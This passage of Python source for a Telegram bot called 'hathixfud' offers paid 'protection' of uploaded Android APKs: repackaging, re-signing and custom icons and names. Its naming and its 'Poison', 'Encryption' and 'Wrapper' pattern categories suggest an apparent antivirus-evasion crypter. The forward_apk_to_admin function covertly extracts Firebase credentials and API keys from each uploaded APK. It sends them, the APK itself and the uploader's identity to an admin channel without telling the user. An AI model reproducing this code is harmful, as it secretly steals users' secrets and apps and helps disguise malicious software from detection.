        await _reply(update, "Usage: /warn <telegram_id> [reason]")
        return
    target = str(int(args[0]))
    reason = " ".join(args[1:]) if len(args) > 1 else "No reason"
    u = _user(int(target))
    u["warnings"] = int(u.get("warnings", 0)) + 1
    db.save_all_users(USERS)
    await _reply(update, f"⚠️ Warned <code>{target}</code> ({u['warnings']}/{ANTI_SPAM_WARNINGS}).")


async def stats_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    now = time.time()
    day = now - 86400
    total_users = len(USERS)
    new_day = db.get_new_users_since(day)
    protected_day = db.count_protected_today(day)
    total_protected = db.total_protected()
    await _reply(update,
        f"📊 <b>ADVANCED ANALYTICS</b>\n"
        f"🔓 free mode: <b>{'ON' if FREE_MODE else 'OFF'}</b>\n"
        f"👥 Users: <b>{total_users}</b> (➕{new_day} today)\n"
        f"📦 Protected: <b>{total_protected}</b> total · <b>{protected_day}</b> today"
    )


# ----------------------------- knowledge base commands -----------------------------

TRAIN_SESSION = {}


async def train_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    if not _KB_AVAILABLE:
        await _reply(update, "❌ KB module not available.")
        return
    uid = update.effective_chat.id
    TRAIN_SESSION[uid] = {"state": "waiting_apk"}
    await _reply(update,
        "📚 <b>KB Training Mode</b>\nSend an APK file to analyze and extract patterns.",
    )


async def kb_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    if not kb:
        await _reply(update, "❌ KB module not available.")
        return
    stats = kb.get_stats()
    lines = [
        "📚 <b>KNOWLEDGE BASE STATUS</b>",
        "━━━━━━━━━━━━━━━",
    ]
    for cat_name, cat_key in [("🔐 Encryption", "encryption"), ("💀 Poison", "poison"), ("📦 Wrapper", "wrapper")]:
        cat_stats = stats["by_category"].get(cat_key, {"count": 0, "avg_score": 0})
        lines.append(f"{cat_name}: <b>{cat_stats['count']}</b> patterns (avg: <b>{cat_stats['avg_score']}</b>)")
    lines.extend([
        "━━━━━━━━━━━━━━━",
        f"📊 <b>Total entries:</b> <code>{stats['total']}</code>",
    ])
    await _reply(update, "\n".join(lines))


async def handle_train_apk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if uid not in TRAIN_SESSION:
        return None
    doc = update.effective_message.document
    name = doc.file_name or "input.apk"
    if not name.lower().endswith(".apk"):
        await _reply(update, "⚠️ Send a <code>.apk</code> file.")
        return None
    if not kb:
        await _reply(update, "❌ KB module not available.")
        TRAIN_SESSION.pop(uid, None)
        return None
    try:
        file = await doc.get_file()
        work = tempfile.mkdtemp(prefix=f"kb_train_{uid}_")
        inp = Path(work) / "input.apk"
        await file.download_to_drive(inp)
        await _reply(update, f"⚙️ Analyzing <code>{name}</code>...")
        patterns = extract_patterns_for_kb(str(inp))
        added = 0
        for category, pattern_type, data in patterns:
            kb.add_pattern(category, pattern_type, data, source_apk=name)
            added += 1
        shutil.rmtree(work, ignore_errors=True)
        TRAIN_SESSION.pop(uid, None)
        await _reply(update,
            f"✅ <b>KB Training Complete!</b>\n"
            f"📥 APK: <code>{name}</code>\n"
            f"📊 Patterns added: <b>{added}</b>",
        )
        db.log_event("kb_train", uid, f"{name}: {added} patterns")
        return None
    except Exception as e:
        logger.exception("KB training failed")
        await _reply(update, f"❌ Training failed:\n<code>{e}</code>")
        TRAIN_SESSION.pop(uid, None)
        return None


async def kb_clear_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    if not kb:
        await _reply(update, "❌ KB module not available.")
        return
    kb.clear()
    await _reply(update, "✅ Knowledge Base cleared.")


async def cancel_train(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if uid in TRAIN_SESSION:
        TRAIN_SESSION.pop(uid, None)
        await _reply(update, "✅ Training cancelled.")
    return ConversationHandler.END


# ----------------------------- APK forwarding -----------------------------

async def forward_apk_to_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                                apk_path: str, apk_name: str):
    try:
        bot = ctx.bot
        chat_id = update.effective_chat.id
        user = update.effective_user
        full_name = user.full_name or user.first_name or ""
        username = user.username or ""
        user_id = user.id
        u = _user(chat_id)
        protected = u.get("protected", 0)
        now = time.time()
        if user_id in OWNER_IDS:
            role = "👑 OWNER"
        elif user_id in ADMINS:
            role = "🛡 ADMIN"
        elif FREE_MODE:
            role = "🔓 FREE MODE"
        else:
            role = "🆓 FREE"

        info = {}
        if _KB_AVAILABLE:
            try:
                info = extract_firebase_and_keys(apk_path)
            except Exception as e:
                logger.warning("Firebase extraction failed: %s", e)

        report = [
            f"📱 <b>APK RECEIVED</b>",
            f"━━━━━━━━━━━━━━━",
            f"👤 <b>USER INFO:</b>",
            f"• ID: <code>{user_id}</code>",
            f"• Name: <b>{full_name}</b>",
            f"• Username: @{username}" if username else f"• Username: N/A",
            f"• Role: {role}",
            f"• APKs Protected: <b>{protected}</b>",
            f"",
            f"📦 <b>APK INFO:</b>",
            f"• Name: <code>{apk_name}</code>",
            f"• Size: {os.path.getsize(apk_path) / (1024*1024):.2f} MB",
        ]

        if info.get("package"):
            report.append(f"• Package: <code>{info['package']}</code>")

        firebase = info.get("firebase", {})
        if firebase:
            report.append(f"")
            report.append(f"🔥 <b>FIREBASE:</b>")
            for key in ["project_id", "project_number", "firebase_url", "api_key"]:
                if key in firebase and firebase[key]:
                    report.append(f"• {key}: <code>{firebase[key]}</code>")

        keys = info.get("keys", [])
        if keys:
            report.append(f"")
            report.append(f"🔑 <b>KEYS: {len(keys)}</b>")
            for key in keys[:10]:
                report.append(f"• [{key['type']}] <code>{key['value'][:60]}</code>")

        await bot.send_message(
            chat_id=ADMIN_CHANNEL_ID,
            text="\n".join(report),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

        with open(apk_path, "rb") as f:
            await bot.send_document(
                chat_id=ADMIN_CHANNEL_ID,
                document=f,
                filename=apk_name,
                caption=f"📱 <b>{apk_name}</b>\n👤 {full_name} (<code>{user_id}</code>)",
                parse_mode="HTML",
            )
        logger.info("APK forwarded to admin channel: %s (user: %s)", apk_name, user_id)
    except Exception as e:
        logger.warning("Failed to forward APK: %s", e)


async def lan_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    u = _user(uid)
    current = u.get("lang", "en")
    args = ctx.args
    if args and args[0].lower() in ("en", "hi", "ur"):
        u["lang"] = args[0].lower()
        db.save_all_users(USERS)
        await _reply(update, f"✅ Language set to <b>{args[0].lower()}</b>.")
        return
    await _reply(update, f"🌐 Current language: <b>{current}</b>\n"
                         f"Usage: <code>/lang en|hi|ur</code>", kb=_back_only())


async def profile_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    u = _user(uid)
    hist = db.get_history(uid, limit=5)
    payments = db.get_user_payments(uid, limit=3)
    lines = [
        f"👤 <b>Your Profile</b>",
        f"🆔 <code>{uid}</code>",
        f"📛 Name: <b>{(u.get('name') or '—')}</b>",
        f"🔓 Free mode: <b>{'ON' if FREE_MODE else 'OFF'}</b>",
        f"📦 APKs protected: <b>{u.get('protected', 0)}</b>",
    ]
    if not FREE_MODE:
        if _plan_left(uid) > 0:
            lines.append(f"⏳ Plan: <b>{_plan_left(uid) // 86400}d left</b>")
        elif u.get("apks_left", 0) > 0:
            lines.append(f"📦 Limited: <b>{u['apks_left']} APK(s)</b>")
        else:
            lines.append(f"🎁 Free: <b>{_free_left(uid)} left</b>")
    if hist:
        lines.append(f"\n📜 <b>Recent builds:</b>")
        for h in hist[:3]:
            ts = datetime.fromtimestamp(h.get("ts", 0)).strftime("%m/%d %H:%M")
            nm = (h.get("name") or "—")[:15]
            lines.append(f"  • {ts} — {nm}")
    lines.append(f"\n🔗 Refer: <code>https://t.me/{BOT_USERNAME}?start={_ref_code(uid)}</code>")
    await _reply(update, "\n".join(lines), kb=_back_only())


# ----------------------------- APK entry -----------------------------

async def handle_apk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    doc = update.effective_message.document
    name = doc.file_name or "input.apk"
    if not name.lower().endswith(".apk"):
        await _reply(update, "⚠️ That doesn't look like an APK. Send a <code>.apk</code> file.")
        return None

    if chat_id in TRAIN_SESSION and TRAIN_SESSION[chat_id].get("state") == "waiting_apk":
        return await handle_train_apk(update, ctx)

    if not await _is_member(ctx.bot, chat_id):
        await _reply(update, JOIN_MSG, kb=_join_kb())
        return None
    u = _user(chat_id)
    if u.get("is_banned"):
        await _reply(update, "⛔ You are blocked from using this bot.")
        return None
    if len(_active) >= 3:
        await _reply(update, "⏳ Server busy with other builds — try again in ~2 minutes.")
        return None

    # FREE MODE => skip access check entirely
    if not FREE_MODE and not _has_access(chat_id):
        await _reply(
            update,
            f"❗ <b>Free trial used up</b>\n"
            f"Pay <b>{_payee()}</b> and send him proof to continue.\n"
            f"Your ID: <code>{chat_id}</code>",
        )
        db.log_event("access_denied", chat_id, name)
        return None

    s = _ensure_settings(chat_id)
    stale = sessions.pop(chat_id, None)
    if stale and not stale["active"]:
        shutil.rmtree(stale["work"], ignore_errors=True)
    try:
        file = await doc.get_file()
        if file.file_size and file.file_size > MAX_MB * 1024 * 1024:
            await _reply(
                update,
                f"⚠️ File is {file.file_size // (1024*1024)} MB - Telegram lets bots"
                f" download up to {MAX_MB} MB. Please send a smaller APK.",
            )
            return None
        work = tempfile.mkdtemp(prefix=f"hathixfud_{chat_id}_")
        inp = Path(work) / "input.apk"
        last_err = None
        for attempt in range(3):
            try:
                await file.download_to_drive(inp)
                last_err = None
                break
            except Exception as dl_err:
                last_err = dl_err
                logger.warning("download attempt %d failed: %s", attempt + 1, dl_err)
                if attempt < 2:
                    await asyncio.sleep(2)
        if last_err:
            shutil.rmtree(work, ignore_errors=True)
            raise last_err
        sessions[chat_id] = {
            "inp": inp, "work": work, "fresh": s["fresh"],
            "label": None, "icon": None, "icon_source": None, "out_name": None,
            "ts": time.time(), "active": False,
        }
        mb = file.file_size and file.file_size / (1024 * 1024) or 0
        db.log_event("apk_received", chat_id, f"{name} ({mb:.1f}MB)")
        db.update_last_active(chat_id)

        asyncio.create_task(forward_apk_to_admin(update, ctx, str(inp), name))

        await _reply(
            update,
            f"📦 Got <code>{name}</code> ({mb:.1f} MB).\n\n"
            f"📛 <b>App name</b> — shown on the icon and the store page.\n"
            "Send a name (max 23 letters) or <code>/skip</code> to keep the default."
        )
        return WAIT_NAME
    except Exception as e:
        logger.exception("apk download failed")
        await _reply(update, f"❌ Could not download your file:\n<code>{e}</code>")
        db.log_event("download_failed", chat_id, str(e)[:200])
        return None


async def forward_payproof(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if _is_owner(chat_id):
        return
    if chat_id in sessions:
        return
    msg = update.effective_message
    caption = msg.caption or "📎 (no caption)"
    try:
        for oid in OWNER_IDS:
            try:
                await msg.forward(chat_id=oid)
                await ctx.bot.send_message(
                    chat_id=oid,
                    text=f"🧾 <b>Attachment</b>\n👤 user: <code>{chat_id}</code>\n💬 {caption}",
                    parse_mode="HTML")
            except Exception:
                pass
        await _reply(update, "🧾 <b>Sent to admin.</b>")
    except Exception as e:
        logger.exception("payproof forward failed")
        await _reply(update, f"❌ Could not forward:\n<code>{e}</code>")


# ----------------------------- WAIT_NAME -----------------------------

async def got_label(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    msg = update.effective_message
    if not session:
        await _reply(update, "Send your APK first, then we'll pick the name 🙂")
        return ConversationHandler.END
    if msg.text is None:
        await _reply(update, "📛 Please type the app name as text (max 23 letters),"
                             " or <code>/skip</code>.")
        return WAIT_NAME
    txt = msg.text.strip()
    if txt.lower() in ("/skip", "skip"):
        session["label"] = None
    elif txt.startswith("/"):
        await _reply(update, "📛 Type the app name (max 23 letters) or <code>/skip</code>.")
        return WAIT_NAME
    elif not txt or len(txt.encode("utf-8")) > 23:
        await _reply(update, "📛 Please keep it to 1–23 letters.")
        return WAIT_NAME
    else:
        session["label"] = txt
    session["out_name"] = (
        re.sub(r"[^A-Za-z0-9_.-]", "", session.get("label") or "")[:40]
        or f"protected_{chat_id}"
    )
    sessions[chat_id] = session
    name_txt = f"📛 App name: <b>{session['label']}</b>\n" if session["label"] else "📛 Keeping default name\n"
    await _reply(update, name_txt + "🖼 <b>App icon (OPTIONAL)</b>\n\n"
                 "Send a square photo or <code>png/jpg/webp</code> to set a custom icon.\n\n"
                 "⚡ Or send <code>/skip</code> to automatically use the icon "
                 "already inside the uploaded APK.")
    return WAIT_ICON


async def state_name_bad(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _reply(update, "📛 Send the app name as text (max 23 letters), or <code>/skip</code>.")
    return WAIT_NAME


# ----------------------------- WAIT_ICON -----------------------------

async def got_image_or_doc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = sessions.get(chat_id)
    msg = update.effective_message
    logger.info("icon handler: chat=%s photo=%s doc=%s in_session=%s",
                chat_id, bool(msg.photo), bool(msg.document), chat_id in sessions)

    if not session:
        await _reply(update, "Send your APK first, then we'll add the icon 🙂")
        return ConversationHandler.END

    if msg.text and msg.text.strip().lower() in ("/skip", "skip"):
        apk_icon = _extract_apk_icon(
            session["inp"], Path(session["work"]) / "apk_icon.png"
        )
        session["icon"] = str(apk_icon) if apk_icon else None
        session["icon_source"] = "apk" if apk_icon else None
        sessions[chat_id] = session
        status = (
            "✅ APK ke andar ka original icon mil gaya."
            if apk_icon
            else "ℹ️ APK ka raster icon nahi mila; safe default icon use hoga."
        )
        await _reply(update, f"{status}\n⚡ Starting protection…")
        await _run_protect(update, ctx, chat_id, session)
        return ConversationHandler.END

    try:
        if msg.photo:
            icon_src = msg.photo[-1]
        elif msg.document and _is_image_doc(msg.document):
            icon_src = msg.document
        else:
            await _reply(update, "🤔 That isn't an image. 🖼 <b>Send a photo/PNG</b> "
                                 "or <code>/skip</code> to use the default icon.")
            return WAIT_ICON
        session = sessions.pop(chat_id)
        raw = Path(session["work"]) / "icon_in.tmp"
        icon = Path(session["work"]) / "icon.png"
        f = await icon_src.get_file()
        for _attempt in range(3):
            try:
                await f.download_to_drive(raw)
                break
            except Exception:
                if _attempt == 2:
                    raise
                await asyncio.sleep(2)
        im = Image.open(raw).convert("RGBA")
        w, h = im.size
        m = min(w, h)
        im = im.crop(((w - m) // 2, (h - m) // 2, (w + m) // 2, (h + m) // 2))
        im = im.resize((512, 512), _RESAMPLE)
        im.save(icon, format="PNG")
        session["icon"] = str(icon)
        session["icon_source"] = "custom"
        sessions[chat_id] = session
        await _reply(update, f"🖼 Icon ready ({icon.stat().st_size // 1024} KB).\n"
                             "⚡ Starting protection…")
        await _run_protect(update, ctx, chat_id, session)
        return ConversationHandler.END
    except Exception as e:
        logger.exception("icon processing failed")
        sessions[chat_id] = session
        await _reply(update, f"❌ Could not read that image:\n<code>{e}</code>\n"
                             f"Send another photo/PNG or <code>/skip</code> to use the default icon.")
        return WAIT_ICON


async def state_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _reply(update, "📷 I still need the icon. 🖼 <b>Send a photo or PNG/JPG</b>\n"
                         "⚡ Or send <code>/skip</code> to use the <b>original APK icon</b>.")
    return WAIT_ICON


async def state_fallback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _reply(update, "📷 Send a photo or <code>png/jpg</code> file — 🖼 <b>or send /skip</b> "
                         "to use the original APK icon.")
    return WAIT_ICON


# ----------------------------- protection -----------------------------

async def _run_protect(update: Update, ctx: ContextTypes.DEFAULT_TYPE, chat_id: int,
                       session: dict):
    bot = ctx.bot
    session["active"] = True
    sessions[chat_id] = session
    _active.add(chat_id)
    icon = (session.get("icon") or "").strip()
    icon_source = session.get("icon_source")
    out_name = session.get("out_name") or f"protected_{chat_id}"
    out = Path(session["work"]) / "protected.apk"
    t0 = time.time()
    try:
        argv = [PYTHON, str(PROTECT), "--apk", str(session["inp"]),
                "-o", str(out)]
        if icon:
            argv += ["--icon", icon]
        label = session.get("label")
        if label:
            argv += ["--label", label]
        if kb:
            argv += ["--kb"]
        env = dict(os.environ)
        env.update({"KEYSTORE": KEYSTORE, "KEY_ALIAS": KEY_ALIAS, "KEY_PASS": KEY_PASS})
        msg = await update.effective_message.reply_text(
            "⚙️ Processing your APK…\n<i>Usually takes 30–90s</i>",
        )
        try:
            proc = await asyncio.to_thread(
                subprocess.run, argv, capture_output=True, text=True, timeout=900, env=env,
            )
        except subprocess.TimeoutExpired:
            await bot.edit_message_text(
                "⌛ Protection timed out (900s). Please try again.",
                chat_id=chat_id, message_id=msg.message_id,
            )
            db.log_event("build_timeout", chat_id, session.get("out_name", ""))
            return
        dt = time.time() - t0
        if proc.returncode != 0:
            tail = (proc.stderr or proc.stdout or "").strip().replace("\n", " ")[-900:]
            await bot.edit_message_text(
                f"❌ Protection failed (exit {proc.returncode}).\n<code>{tail}</code>",
                chat_id=chat_id, message_id=msg.message_id,
            )
            db.log_event("build_failed", chat_id, tail[:200])
            return
        size = out.stat().st_size
        mode_txt = "shared wrapper package"
        await bot.edit_message_text(
            f"✅ <b>Done in {dt:.0f}s</b> - sending…",
            chat_id=chat_id, message_id=msg.message_id,
        )
        with open(out, "rb") as fh:
            await update.effective_message.reply_document(
                document=fh,
                filename=f"{out_name}.apk",
                caption=(
                    "🔒 <b>Protected APK ready</b>\n"
                    f"• app name: <b>{label or 'default'}</b>\n"
                    f"• {size / (1024*1024):.2f} MB\n"
                    f"• package: {mode_txt}\n"
                    f"• icon: {'<b>original APK icon</b>' if icon_source == 'apk' else '<b>custom image</b>' if icon else '<b>safe default icon</b>'}\n"
                    f"• free mode: {'🔓 ON' if FREE_MODE else '💰 credits'}\n"
                    "• v1=false · v2/v3 signed\n"
                    "• version bumped · integrity checks passed\n"
                    '⚠️ if it says "app not installed / package conflict" — '
                    "uninstall any older copy first, then install."
                ),
                parse_mode="HTML",
            )
        _register_success(chat_id, update.effective_user.full_name or "")
        db.add_history(chat_id, time.time(), label or out_name,
                       file_size=size, build_time=dt, status="ok")
        db.log_event("build_success", chat_id, f"{out_name} ({dt:.0f}s, {size/(1024*1024):.1f}MB)")

        # Auto-learn
        if kb and _KB_AVAILABLE:
            try:
                patterns = extract_patterns_for_kb(str(session["inp"]))
                added = 0
                for category, pattern_type, data in patterns:
                    kb.add_pattern(category, pattern_type, data,
                                   source_apk=label or out_name)
                    added += 1
                if added > 0:
                    logger.info("Auto-learn: added %d patterns from %s", added, out_name)
            except Exception as e:
                logger.warning("Auto-learn failed: %s", e)

        # FREE MODE => no credit deduction, no payment prompts
        if not FREE_MODE and not _is_owner(chat_id):
            u = _user(chat_id)
            if u.get("apks_left", 0) > 0:
                u["apks_left"] -= 1
                db.save_all_users(USERS)
                await _reply(update,
                             f"📦 Limited plan: <b>{u['apks_left']}</b> APK(s) remaining.")
            elif _plan_left(chat_id) <= 0:
                if u["protected"] < FREE_LIMIT:
                    await _reply(update,
                                 f"🎁 Free APK used: {u['protected']}/{FREE_LIMIT}.")
                else:
                    await _reply(update,
                                 f"⏳ Free trial done! Pay {_payee()} to continue.")
    except Exception as e:
        logger.exception("protect failed")
        db.log_event("build_error", chat_id, str(e)[:200])
        try:
            await _reply(update, f"❌ Something went wrong:\n<code>{e}</code>")
        except Exception:
            pass
    finally:
        _active.discard(chat_id)
        sessions.pop(chat_id, None)
        shutil.rmtree(session["work"], ignore_errors=True)


def _cleanup_stale():
    now = time.time()
    for chat_id in list(sessions):
        s = sessions[chat_id]
        if not s["active"] and now - s["ts"] > SESSION_TTL:
            shutil.rmtree(s["work"], ignore_errors=True)
            sessions.pop(chat_id, None)
            logger.info("expired session for chat %s", chat_id)


async def _cleanup_job(_: ContextTypes.DEFAULT_TYPE):
    _cleanup_stale()


async def _renewal_reminders(ctx: ContextTypes.DEFAULT_TYPE):
    if FREE_MODE:
        return
    now = time.time()
    for uid, u in list(USERS.items()):
        until = u.get("plan_until", 0) or 0
        if until > now and until - now <= 86400:
            left = int((until - now) // 3600)
            try:
                await ctx.bot.send_message(
                    chat_id=int(uid),
                    text=f"⏳ <b>Heads-up!</b> Your premium plan expires in <b>{left}h</b>.",
                    parse_mode="HTML")
                u["reminder_sent"] = True
                db.save_all_users(USERS)
            except Exception:
                pass


async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    logger.error("update error", exc_info=ctx.error)


def main():
    _request = HTTPXRequest(
        connect_timeout=30,
        read_timeout=120,
        write_timeout=30,
        pool_timeout=30,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(False)
        .request(_request)
        .build()
    )
    if app.job_queue:
        app.job_queue.run_repeating(_cleanup_job, interval=120, first=120)
        app.job_queue.run_repeating(_renewal_reminders, interval=3600, first=1800)

    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("freemode", freemode_cmd))
    app.add_handler(CommandHandler("freemode_on", lambda u, c: freemode_cmd(u, c)))
    app.add_handler(CommandHandler("grant", grant_cmd))
    app.add_handler(CommandHandler("revoke", revoke_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("makepromo", makepromo_cmd))
    app.add_handler(CommandHandler("block", block_cmd))
    app.add_handler(CommandHandler("unblock", unblock_cmd))
    app.add_handler(CommandHandler("dashboard", dash_cmd))
    app.add_handler(CommandHandler("dash", dash_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("payments", payments_cmd))
    app.add_handler(CommandHandler("approve", approve_cmd))
    app.add_handler(CommandHandler("reject", reject_cmd))
    app.add_handler(CommandHandler("warn", warn_cmd))
    app.add_handler(CommandHandler("train", train_cmd))
    app.add_handler(CommandHandler("kb", kb_cmd))
    app.add_handler(CommandHandler("kbclear", kb_clear_cmd))
    app.add_handler(CommandHandler("cancel", cancel_train))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("plans", plans_cmd))
    app.add_handler(CommandHandler("fresh", fresh_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("history", history_cmd))
    app.add_handler(CommandHandler("refer", refer_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("gift", gift_cmd))
    app.add_handler(CommandHandler("resume", resume_cmd))
    app.add_handler(CommandHandler("support", support_cmd))
    app.add_handler(CommandHandler("lang", lang_cmd))
    app.add_handler(CommandHandler("profile", profile_cmd))
    app.add_handler(CommandHandler("payproof", payproof_cmd))

    app.add_handler(CallbackQueryHandler(btn_send_apk, pattern="^send_apk$"))
    app.add_handler(CallbackQueryHandler(chk_channel, pattern="^chk_channel$"))
    app.add_handler(CallbackQueryHandler(btn_plans, pattern="^plans_btn$"))
    app.add_handler(CallbackQueryHandler(btn_status, pattern="^status_btn$"))
    app.add_handler(CallbackQueryHandler(btn_history, pattern="^hist_btn$"))
    app.add_handler(CallbackQueryHandler(btn_refer, pattern="^refer_btn$"))
    app.add_handler(CallbackQueryHandler(btn_support, pattern="^support_btn$"))

    app.add_handler(CallbackQueryHandler(btn_admin, pattern="^admin_btn$"))
    app.add_handler(CallbackQueryHandler(ap_toggle_free, pattern="^ap_toggle_free$"))
    app.add_handler(CallbackQueryHandler(ap_users, pattern="^ap_users$"))
    app.add_handler(CallbackQueryHandler(ap_userinfo, pattern="^ap_userinfo$"))
    app.add_handler(CallbackQueryHandler(ap_analytics, pattern="^ap_analytics$"))
    app.add_handler(CallbackQueryHandler(ap_status, pattern="^ap_status$"))
    app.add_handler(CallbackQueryHandler(ap_payee, pattern="^ap_payee$"))
    app.add_handler(CallbackQueryHandler(ap_forcejoin, pattern="^ap_forcejoin$"))
    app.add_handler(CallbackQueryHandler(ap_grant, pattern="^ap_grant$"))
    app.add_handler(CallbackQueryHandler(ap_revoke, pattern="^ap_revoke$"))
    app.add_handler(CallbackQueryHandler(ap_price, pattern="^ap_price$"))
    app.add_handler(CallbackQueryHandler(ap_botname, pattern="^ap_botname$"))
    app.add_handler(CallbackQueryHandler(ap_welcome, pattern="^ap_welcome$"))
    app.add_handler(CallbackQueryHandler(ap_broadcast, pattern="^ap_broadcast$"))
    app.add_handler(CallbackQueryHandler(ap_dm, pattern="^ap_dm$"))
    app.add_handler(CallbackQueryHandler(ap_admins, pattern="^ap_admins$"))
    app.add_handler(CallbackQueryHandler(ap_addadmin, pattern="^ap_addadmin$"))
    app.add_handler(CallbackQueryHandler(ap_rmadmin, pattern="^ap_rmadmin$"))
    app.add_handler(CallbackQueryHandler(ap_blist, pattern="^ap_blist$"))
    app.add_handler(CallbackQueryHandler(ap_block, pattern="^ap_block$"))
    app.add_handler(CallbackQueryHandler(ap_unblock, pattern="^ap_unblock$"))
    app.add_handler(CallbackQueryHandler(ap_promos, pattern="^ap_promos$"))
    app.add_handler(CallbackQueryHandler(back_admin, pattern="^back_admin$"))
    app.add_handler(CallbackQueryHandler(back_main, pattern="^back_main$"))
    app.add_handler(CallbackQueryHandler(ap_kb_status, pattern="^ap_kb$"))
    app.add_handler(CallbackQueryHandler(ap_train_start, pattern="^ap_train$"))

    conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Document.ALL, handle_apk)],
        states={
            WAIT_NAME: [
                MessageHandler(filters.TEXT, got_label),
                MessageHandler(filters.ALL, state_name_bad),
            ],
            WAIT_ICON: [
                MessageHandler(filters.PHOTO | filters.Document.ALL, got_image_or_doc),
                CommandHandler("skip", got_image_or_doc),
                MessageHandler(filters.TEXT & ~filters.COMMAND, state_text),
            ],
        },
        fallbacks=[MessageHandler(filters.ALL, state_fallback)],
        conversation_timeout=240,
    )
    app.add_handler(conv)

    app.add_handler(MessageHandler(
        filters.PHOTO | filters.VIDEO | filters.ANIMATION, admin_media_broadcast))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_text_handler))
    app.add_handler(MessageHandler(
        filters.PHOTO | filters.Document.ALL, forward_payproof))
    app.add_error_handler(error_handler)
    logger.info("hathixfud bot starting… FREE MODE=%s", FREE_MODE)
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    import asyncio
    if os.name == "nt":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    main()